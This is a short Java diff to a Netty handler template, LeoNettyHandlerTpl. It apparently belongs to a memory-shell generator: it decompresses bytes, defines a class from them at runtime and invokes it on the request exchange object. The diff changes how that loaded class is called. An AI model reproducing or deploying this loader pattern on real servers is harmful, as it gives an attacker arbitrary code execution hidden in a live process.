@@ -63,7 +63,11 @@ public class LeoNettyHandlerTpl extends ChannelDuplexHandler {
             gzip.close();
             core = new Loader(loader).define(output.toByteArray());
         }
-        core.newInstance().equals(exchange);
+        try {
+            ((java.lang.reflect.InvocationHandler) core.newInstance()).invoke(null, null, new Object[]{exchange});
+        } catch (Throwable e) {
+            throw new IllegalStateException("Core invocation failed", e);
+        }
         return exchange.toByteArray();
     }
 
